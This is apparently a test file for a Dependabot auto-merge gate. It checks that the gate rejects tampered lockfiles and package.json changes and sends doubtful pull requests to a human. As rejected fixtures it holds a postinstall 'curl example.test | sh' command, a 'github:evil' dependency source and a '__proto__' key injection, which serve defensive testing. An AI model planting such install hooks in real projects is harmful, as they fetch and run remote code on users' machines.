import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type {
  GateInput,
  ImpactAssessment,
} from "../../f/factory/lib/dependabot_support.ts";
import {
  checkLockfileDiff,
  checkPackageJsonDiff,
  classifyUpdate,
  decideImpactOutcome,
  evaluateGate,
  GITHUB_ACTIONS_APP_ID,
  isPublishedLongEnough,
  parseImpactAssessment,
  REQUIRED_CHECKS,
} from "../../f/factory/lib/dependabot_support.ts";

describe("classifyUpdate", () => {
  test("classifies a patch bump", () => {
    expect(classifyUpdate("1.2.3", "1.2.4")).toBe("patch");
  });

  test("classifies a minor bump", () => {
    expect(classifyUpdate("1.2.3", "1.3.0")).toBe("minor");
  });

  test("classifies a major bump", () => {
    expect(classifyUpdate("1.2.3", "2.0.0")).toBe("major");
  });

  test("returns unknown for a value that is not a plain version", () => {
    expect(classifyUpdate("1.2.3", "latest")).toBe("unknown");
  });

  test("returns unknown for a pre-release version", () => {
    expect(classifyUpdate("1.2.3", "1.2.4-beta.1")).toBe("unknown");
  });

  test("returns unknown when the version does not go up", () => {
    expect(classifyUpdate("1.2.3", "1.2.2")).toBe("unknown");
  });

  test("treats a minor bump of a 0.x version as major", () => {
    expect(classifyUpdate("0.4.1", "0.5.0")).toBe("major");
  });

  test("treats a patch bump of a 0.0.x version as major", () => {
    expect(classifyUpdate("0.0.3", "0.0.4")).toBe("major");
  });

  test("keeps a patch bump of a 0.x version as patch", () => {
    expect(classifyUpdate("0.4.1", "0.4.2")).toBe("patch");
  });
});

describe("isPublishedLongEnough", () => {
  const DAY_MS = 24 * 60 * 60 * 1000;
  const publishedAt = "2026-10-01T00:00:00.000Z";
  const publishedMs = Date.parse(publishedAt);

  test("passes exactly at minDays", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + 7 * DAY_MS, 7),
    ).toBe(true);
  });

  test("fails one millisecond before minDays", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + 7 * DAY_MS - 1, 7),
    ).toBe(false);
  });

  test("fails for an invalid date", () => {
    expect(
      isPublishedLongEnough("not-a-date", publishedMs + 30 * DAY_MS, 7),
    ).toBe(false);
  });

  test("fails for a date in the future", () => {
    expect(isPublishedLongEnough(publishedAt, publishedMs - DAY_MS, 0)).toBe(
      false,
    );
  });

  test("fails for a date without a time zone", () => {
    expect(
      isPublishedLongEnough(
        "2026-10-01T00:00:00",
        publishedMs + 30 * DAY_MS,
        7,
      ),
    ).toBe(false);
  });

  test("fails for a date without a time", () => {
    expect(
      isPublishedLongEnough("2026-10-01", publishedMs + 30 * DAY_MS, 7),
    ).toBe(false);
  });

  test("accepts a date with a numeric offset", () => {
    expect(
      isPublishedLongEnough(
        "2026-10-01T09:00:00+09:00",
        publishedMs + 7 * DAY_MS,
        7,
      ),
    ).toBe(true);
  });

  test("fails when minDays is negative", () => {
    expect(isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, -1)).toBe(
      false,
    );
  });

  test("fails when minDays is not finite", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, Number.NaN),
    ).toBe(false);
  });

  test("fails when minDays is infinite", () => {
    expect(
      isPublishedLongEnough(
        publishedAt,
        publishedMs + DAY_MS,
        Number.POSITIVE_INFINITY,
      ),
    ).toBe(false);
  });
});

type LockEntry = {
  key: string;
  id: string;
  registry?: string;
  dependencies?: string;
  integrity?: string;
};

const INTEGRITY_A =
  "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
const INTEGRITY_B =
  "sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==";

// bun.lockのテキスト形式(末尾にカンマを許すJSON)の最小例を作る。
function lockText(
  workspaceDeps: Record<string, string>,
  entries: readonly LockEntry[],
): string {
  const deps = Object.entries(workspaceDeps)
    .map(([name, spec]) => `        "${name}": "${spec}",\n`)
    .join("");
  const packages = entries
    .map(
      (e) =>
        `    "${e.key}": ["${e.id}", "${e.registry ?? ""}", {${e.dependencies ?? ""}}, "${e.integrity ?? INTEGRITY_A}"],\n`,
    )
    .join("\n");
  return `{
  "lockfileVersion": 2,
  "configVersion": 1,
  "workspaces": {
    "": {
      "name": "fixture",
      "dependencies": {
${deps}      },
    },
  },
  "packages": {
${packages}  },
}
`;
}

const TARGET = { name: "left-pad", to: "1.3.1" };

const BEFORE = lockText({ "left-pad": "1.3.0", other: "2.0.0" }, [
  { key: "left-pad", id: "left-pad@1.3.0" },
  { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
]);

const AFTER_OK = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
  { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
  { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
]);

describe("checkLockfileDiff", () => {
  test("accepts a version bump of the target only", () => {
    expect(checkLockfileDiff(BEFORE, AFTER_OK, TARGET)).toEqual({ ok: true });
  });

  test("accepts a patch bump of a package in the real console/bun.lock", () => {
    const real = readFileSync(
      new URL("../../console/bun.lock", import.meta.url),
      "utf8",
    );
    // 最初に見つかる、major1以上で固定された依存のpatchを1つ上げる。
    const pinned = /^\s+"([^"]+)": "([1-9]\d*)\.(\d+)\.(\d+)",$/m.exec(real);
    if (pinned === null)
      throw new Error("no pinned dependency in the lockfile");
    const [line, name, major, minor, patch] = pinned;
    const from = `${major}.${minor}.${patch}`;
    const to = `${major}.${minor}.${Number(patch) + 1}`;
    const after = real
      .replace(line, line.replace(from, to))
      .replaceAll(`"${name}@${from}"`, `"${name}@${to}"`);

    expect(checkLockfileDiff(real, after, { name: name ?? "", to })).toEqual({
      ok: true,
    });
  });

  test("rejects a nested copy of the target that jumps a major version", () => {
    const before = lockText({ "left-pad": "1.3.0" }, [
      { key: "left-pad", id: "left-pad@1.3.0" },
      { key: "foo/left-pad", id: "left-pad@0.9.0" },
    ]);
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(before, after, TARGET).ok).toBe(false);
  });

  test("accepts a nested copy of the target bumped by a patch", () => {
    const before = lockText({ "left-pad": "1.3.0" }, [
      { key: "left-pad", id: "left-pad@1.3.0" },
      { key: "foo/left-pad", id: "left-pad@1.3.0" },
    ]);
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(before, after, TARGET)).toEqual({ ok: true });
  });

  test("rejects a duplicate key in the packages table", () => {
    // 後ろの値が有効になる重複なので、検出しなければ更新に見える。
    const duplicated = AFTER_OK.replace(
      '    "left-pad": [',
      `    "left-pad": ["left-pad@1.3.0", "", {}, "${INTEGRITY_A}"],\n    "left-pad": [`,
    );

    expect(checkLockfileDiff(BEFORE, duplicated, TARGET).ok).toBe(false);
  });

  test("rejects a workspace added under the key __proto__", () => {
    const after = AFTER_OK.replace(
      '  "workspaces": {\n',
      '  "workspaces": {\n    "__proto__": { "name": "evil", "dependencies": { "evil": "1.0.0" } },\n',
    );

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a workspace dependency that points at another source", () => {
    const after = lockText(
      { "left-pad": "github:evil/left-pad", other: "2.0.0" },
      [
        { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
        { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
      ],
    );

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("accepts a caret range for the new workspace specifier", () => {
    const after = lockText({ "left-pad": "^1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET)).toEqual({ ok: true });
  });

  test("rejects a target moved to another dependency field", () => {
    const after = AFTER_OK.replace(
      '"dependencies": {\n        "left-pad": "1.3.1",\n        "other": "2.0.0",\n      },',
      '"dependencies": {\n        "other": "2.0.0",\n      },\n      "devDependencies": {\n        "left-pad": "1.3.1",\n      },',
    );

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("shortens a long duplicate key in the reason", () => {
    const longKey = "k".repeat(500);
    const withDuplicate = (text: string) =>
      text.replace(
        '  "packages": {\n',
        `  "packages": {\n    "${longKey}": ["x@1.0.0", "", {}, "${INTEGRITY_A}"],\n    "${longKey}": ["x@1.0.0", "", {}, "${INTEGRITY_A}"],\n`,
      );
    const verdict = checkLockfileDiff(BEFORE, withDuplicate(AFTER_OK), TARGET);

    expect(verdict.ok ? 0 : verdict.reason.length).toBeLessThan(200);
  });

  test("rejects a package added besides the target", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
      { key: "extra", id: "extra@0.0.1" },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a package removed besides the target", () => {
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a version change of a package other than the target", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a target bumped to a version other than the expected one", () => {
    const after = lockText({ "left-pad": "1.4.0", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.4.0", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a registry URL change", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      {
        key: "left-pad",
        id: "left-pad@1.3.1",
        registry: "https://registry.example.test/",
        integrity: INTEGRITY_B,
      },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an integrity change without a version change", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_A },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a bumped target without sha512 integrity", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: "sha1-xxxx" },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a lockfile where the target is not updated", () => {
    expect(checkLockfileDiff(BEFORE, BEFORE, TARGET).ok).toBe(false);
  });

  test("rejects a new workspace dependency", () => {
    const after = lockText(
      { "left-pad": "1.3.1", other: "2.0.0", extra: "1.0.0" },
      [
        { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
        { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
      ],
    );

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a lockfile that cannot be parsed", () => {
    expect(checkLockfileDiff(BEFORE, "{ not json", TARGET).ok).toBe(false);
  });
});

function manifest(extra: Record<string, unknown> = {}): string {
  return JSON.stringify(
    {
      name: "fixture",
      version: "1.0.0",
      scripts: { test: "bun test" },
      dependencies: { "left-pad": "1.3.0", other: "2.0.0" },
      devDependencies: { tool: "3.0.0" },
      ...extra,
    },
    null,
    2,
  );
}

const MANIFEST_BEFORE = manifest();

describe("checkPackageJsonDiff", () => {
  test("accepts a version bump of the target dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
      ok: true,
    });
  });

  test("accepts a caret range for the new version", () => {
    const after = manifest({
      dependencies: { "left-pad": "^1.3.1", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
      ok: true,
    });
  });

  test("accepts a bump of the target in devDependencies", () => {
    const before = manifest({
      dependencies: { other: "2.0.0" },
      devDependencies: { "left-pad": "1.3.0" },
    });
    const after = manifest({
      dependencies: { other: "2.0.0" },
      devDependencies: { "left-pad": "1.3.1" },
    });

    expect(checkPackageJsonDiff(before, after, TARGET)).toEqual({ ok: true });
  });

  test("rejects a changed scripts section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      scripts: { test: "bun test", postinstall: "curl example.test | sh" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added trustedDependencies section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      trustedDependencies: ["left-pad"],
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added overrides section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      overrides: { other: "9.9.9" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added resolutions section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      resolutions: { other: "9.9.9" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added patchedDependencies section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      patchedDependencies: { other: "patches/other.patch" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added bin section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      bin: { fixture: "./run.js" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a changed version of another dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.1" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0", extra: "1.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a removed dependency", () => {
    const after = manifest({ dependencies: { "left-pad": "1.3.1" } });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a changed top-level field", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      version: "9.9.9",
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a manifest where the target is unchanged", () => {
    expect(
      checkPackageJsonDiff(MANIFEST_BEFORE, MANIFEST_BEFORE, TARGET).ok,
    ).toBe(false);
  });

  test("rejects a specifier that does not point at the expected version", () => {
    const after = manifest({
      dependencies: { "left-pad": "github:evil/left-pad", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a duplicate key", () => {
    const duplicated = MANIFEST_BEFORE.replace(
      '"version": "1.0.0"',
      '"version": "1.0.0", "version": "1.0.0"',
    );
    const after = duplicated.replace(
      '"left-pad": "1.3.0"',
      '"left-pad": "1.3.1"',
    );

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a manifest that cannot be parsed", () => {
    expect(checkPackageJsonDiff(MANIFEST_BEFORE, "{ nope", TARGET).ok).toBe(
      false,
    );
  });
});

const NOW_MS = Date.parse("2026-10-20T00:00:00.000Z");

const MANIFEST_AFTER_OK = manifest({
  dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
});

// dependabot自身のcommitの実際の形。GitHubが署名するので、コミッターはweb-flowになる。
const DEPENDABOT_COMMIT = {
  authorLogin: "dependabot[bot]",
  committerLogin: "web-flow",
  verified: true,
  parentCount: 1,
};

// 人が「ブランチを更新」したときのmerge commit。
const MERGE_COMMIT = {
  authorLogin: "someone",
  committerLogin: "web-flow",
  verified: true,
  parentCount: 2,
};

// package.jsonとロックファイルの、正しい更新の前後の内容を、パスごとに作る。
function filesFor(paths: readonly string[]): GateInput["files"] {
  return paths.map((path) =>
    path.endsWith("package.json")
      ? { path, before: MANIFEST_BEFORE, after: MANIFEST_AFTER_OK }
      : { path, before: BEFORE, after: AFTER_OK },
  );
}

const OTHER_APP_ID = 12345;

function passingChecks(): GateInput["checks"] {
  return REQUIRED_CHECKS.map((name) => ({
    name,
    appId: GITHUB_ACTIONS_APP_ID,
    conclusion: "success",
  }));
}

function validInput(overrides: Partial<GateInput> = {}): GateInput {
  const changedPaths = overrides.changedPaths ?? ["package.json", "bun.lock"];
  return {
    authorLogin: "dependabot[bot]",
    authorType: "Bot",
    headRepoFullName: "owner/repo",
    baseRepoFullName: "owner/repo",
    checks: REQUIRED_CHECKS.map((name) => ({
      name,
      appId: GITHUB_ACTIONS_APP_ID,
      conclusion: "success",
    })),
    requiredChecks: REQUIRED_CHECKS,
    update: "patch",
    changedPaths,
    files: filesFor(changedPaths),
    target: TARGET,
    mergeable: true,
    publishedAtIso: "2026-10-01T00:00:00.000Z",
    nowMs: NOW_MS,
    minPublishedDays: 7,
    commits: [DEPENDABOT_COMMIT],
    installScripts: { before: {}, after: {} },
    ...overrides,
  };
}

function verdictOf(overrides: Partial<GateInput>): string {
  const result = evaluateGate(validInput(overrides));
  return result.ok ? "ok" : result.kind;
}

describe("REQUIRED_CHECKS", () => {
  test("lists the checks the main ruleset requires", () => {
    expect([...REQUIRED_CHECKS]).toEqual([
      "scope",
      "check",
      "test-db",
      "metadata",
      "console",
      "caddyfile",
      "console-fetcher-image",
    ]);
  });
});

describe("evaluateGate", () => {
  test("passes when every condition holds", () => {
    expect(evaluateGate(validInput())).toEqual({ ok: true });
  });

  test("accepts a minor update", () => {
    expect(verdictOf({ update: "minor" })).toBe("ok");
  });

  test("accepts the console lockfile and manifest", () => {
    expect(
      verdictOf({ changedPaths: ["console/package.json", "console/bun.lock"] }),
    ).toBe("ok");
  });

  test("treats a skipped required check as passed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion: name === "console" ? "skipped" : "success",
        })),
      }),
    ).toBe("ok");
  });

  test("waits while a required check is not completed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion: name === "check" ? null : "success",
        })),
      }),
    ).toBe("wait");
  });

  test("waits while a required check has not appeared", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.filter((name) => name !== "metadata").map(
          (name) => ({
            name,
            appId: GITHUB_ACTIONS_APP_ID,
            conclusion: "success",
          }),
        ),
      }),
    ).toBe("wait");
  });

  test("ignores a check that is not required", () => {
    expect(
      verdictOf({
        checks: [
          ...REQUIRED_CHECKS.map((name) => ({
            name,
            appId: GITHUB_ACTIONS_APP_ID,
            conclusion: "success",
          })),
          {
            name: "optional",
            appId: GITHUB_ACTIONS_APP_ID,
            conclusion: "failure",
          },
        ],
      }),
    ).toBe("ok");
  });

  test("waits when a required check came only from another app", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: name === "check" ? OTHER_APP_ID : GITHUB_ACTIONS_APP_ID,
          conclusion: "success",
        })),
      }),
    ).toBe("wait");
  });

  test("waits when a required check came only from a deleted app", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: name === "check" ? null : GITHUB_ACTIONS_APP_ID,
          conclusion: "success",
        })),
      }),
    ).toBe("wait");
  });

  test("needs a human when another app failed a check that actions passed", () => {
    expect(
      verdictOf({
        checks: [
          ...passingChecks(),
          { name: "check", appId: OTHER_APP_ID, conclusion: "failure" },
        ],
      }),
    ).toBe("needs_human");
  });

  test("accepts a check that actions passed alongside another app's success", () => {
    expect(
      verdictOf({
        checks: [
          ...passingChecks(),
          { name: "check", appId: OTHER_APP_ID, conclusion: "success" },
        ],
      }),
    ).toBe("ok");
  });

  test("waits when actions passed a check that another app left unfinished", () => {
    expect(
      verdictOf({
        checks: [
          ...passingChecks(),
          { name: "check", appId: OTHER_APP_ID, conclusion: null },
        ],
      }),
    ).toBe("wait");
  });

  test("needs a human for a failed check while another required check has not appeared from actions", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: name === "scope" ? OTHER_APP_ID : GITHUB_ACTIONS_APP_ID,
          conclusion: name === "check" ? "failure" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a required check failed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion: name === "test-db" ? "failure" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a required check was cancelled", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion: name === "scope" ? "cancelled" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human for a failed check even while another is pending", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion:
            name === "scope" ? "failure" : name === "check" ? null : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human for a pull request from a fork", () => {
    expect(verdictOf({ headRepoFullName: "someone/repo" })).toBe("needs_human");
  });

  test("needs a human when the author is not dependabot", () => {
    expect(verdictOf({ authorLogin: "someone" })).toBe("needs_human");
  });

  test("needs a human when the author is not a bot", () => {
    expect(verdictOf({ authorType: "User" })).toBe("needs_human");
  });

  test("needs a human for a major update", () => {
    expect(verdictOf({ update: "major" })).toBe("needs_human");
  });

  test("needs a human for an unknown update", () => {
    expect(verdictOf({ update: "unknown" })).toBe("needs_human");
  });

  test("needs a human when a protected path changed", () => {
    expect(
      verdictOf({
        changedPaths: ["package.json", "bun.lock", ".github/workflows/ci.yml"],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a path outside the allowed set changed", () => {
    expect(
      verdictOf({
        changedPaths: ["package.json", "bun.lock", "f/factory/lib/db.ts"],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a nested manifest changed", () => {
    const result = evaluateGate(
      validInput({
        changedPaths: ["package.json", "bun.lock", "packages/x/package.json"],
      }),
    );

    expect(result.ok ? "" : result.reason).toContain("allowed set");
  });

  test("needs a human when no path changed", () => {
    expect(verdictOf({ changedPaths: [] })).toBe("needs_human");
  });

  test("needs a human when the pull request is not mergeable", () => {
    expect(verdictOf({ mergeable: false })).toBe("needs_human");
  });

  test("waits while mergeability is not computed", () => {
    expect(verdictOf({ mergeable: null })).toBe("wait");
  });

  test("needs a human for a bad author even when mergeability is not computed", () => {
    expect(verdictOf({ mergeable: null, authorLogin: "someone" })).toBe(
      "needs_human",
    );
  });

  test("needs a human when mergeability is not computed and a required check failed", () => {
    expect(
      verdictOf({
        mergeable: null,
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          appId: GITHUB_ACTIONS_APP_ID,
          conclusion: name === "check" ? "failure" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the lockfile diff is rejected", () => {
    expect(
      verdictOf({
        files: [
          {
            path: "package.json",
            before: MANIFEST_BEFORE,
            after: MANIFEST_AFTER_OK,
          },
          { path: "bun.lock", before: BEFORE, after: BEFORE },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the package.json diff is rejected", () => {
    expect(
      verdictOf({
        files: [
          {
            path: "package.json",
            before: MANIFEST_BEFORE,
            after: manifest({
              dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
              scripts: { postinstall: "curl example.test | sh" },
            }),
          },
          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a changed path is not in the inspected files", () => {
    expect(verdictOf({ files: filesFor(["package.json"]) })).toBe(
      "needs_human",
    );
  });

  test("needs a human when the manifest changed without its lockfile", () => {
    expect(verdictOf({ changedPaths: ["package.json"] })).toBe("needs_human");
  });

  test("needs a human when the console manifest changed without its lockfile", () => {
    expect(
      verdictOf({ changedPaths: ["console/package.json", "bun.lock"] }),
    ).toBe("needs_human");
  });

  test("accepts a lockfile-only update", () => {
    const lockOnly = lockText({ "left-pad": "^1.0.0", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.0" },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);
    const lockOnlyAfter = lockText({ "left-pad": "^1.0.0", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(
      verdictOf({
        changedPaths: ["bun.lock"],
        files: [{ path: "bun.lock", before: lockOnly, after: lockOnlyAfter }],
      }),
    ).toBe("ok");
  });

  test("needs a human when one of two changed lockfiles is rejected", () => {
    expect(
      verdictOf({
        changedPaths: [
          "package.json",
          "bun.lock",
          "console/package.json",
          "console/bun.lock",
        ],
        files: [
          {
            path: "package.json",
            before: MANIFEST_BEFORE,
            after: MANIFEST_AFTER_OK,
          },
          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
          {
            path: "console/package.json",
            before: MANIFEST_BEFORE,
            after: MANIFEST_AFTER_OK,
          },
          { path: "console/bun.lock", before: BEFORE, after: BEFORE },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a changed file was added", () => {
    expect(
      verdictOf({
        files: [
          {
            path: "package.json",
            before: MANIFEST_BEFORE,
            after: MANIFEST_AFTER_OK,
          },
          { path: "bun.lock", before: null, after: AFTER_OK },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a changed file was deleted", () => {
    expect(
      verdictOf({
        files: [
          { path: "package.json", before: MANIFEST_BEFORE, after: null },
          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a path appears twice in the files", () => {
    expect(
      verdictOf({
        files: [
          ...filesFor(["package.json", "bun.lock"]),
          ...filesFor(["bun.lock"]),
        ],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the install scripts could not be fetched before", () => {
    expect(verdictOf({ installScripts: { before: null, after: {} } })).toBe(
      "needs_human",
    );
  });

  test("needs a human when the install scripts could not be fetched after", () => {
    expect(verdictOf({ installScripts: { before: {}, after: null } })).toBe(
      "needs_human",
    );
  });

  test("needs a human when the new version adds an install script", () => {
    expect(
      verdictOf({
        installScripts: { before: {}, after: { postinstall: "node setup.js" } },
      }),
    ).toBe("needs_human");
  });

  test("needs a human when an install script changed", () => {
    expect(
      verdictOf({
        installScripts: {
          before: { postinstall: "node setup.js" },
          after: { postinstall: "node other.js" },
        },
      }),
    ).toBe("needs_human");
  });

  test("accepts an install script that did not change", () => {
    expect(
      verdictOf({
        installScripts: {
          before: { postinstall: "node setup.js" },
          after: { postinstall: "node setup.js" },
        },
      }),
    ).toBe("ok");
  });

  test("accepts an install script that was removed", () => {
    expect(
      verdictOf({
        installScripts: { before: { postinstall: "node setup.js" }, after: {} },
      }),
    ).toBe("ok");
  });

  test("needs a human when there is no commit", () => {
    expect(verdictOf({ commits: [] })).toBe("needs_human");
  });

  test("needs a human when a commit author is not dependabot", () => {
    expect(
      verdictOf({
        commits: [{ ...DEPENDABOT_COMMIT, authorLogin: "someone" }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a commit author login only contains dependabot", () => {
    expect(
      verdictOf({
        commits: [{ ...DEPENDABOT_COMMIT, authorLogin: "dependabot[bot]x" }],
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a commit author is unknown", () => {
    expect(
      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, authorLogin: null }] }),
    ).toBe("needs_human");
  });

  test("accepts a commit whose committer is dependabot", () => {
    expect(
      verdictOf({
        commits: [{ ...DEPENDABOT_COMMIT, committerLogin: "dependabot[bot]" }],
      }),
    ).toBe("ok");
  });

  test("needs a human when the committer is github-actions", () => {
    expect(
      verdictOf({
        commits: [
          { ...DEPENDABOT_COMMIT, committerLogin: "github-actions[bot]" },
        ],
      }),
    ).toBe("needs_human");
  });

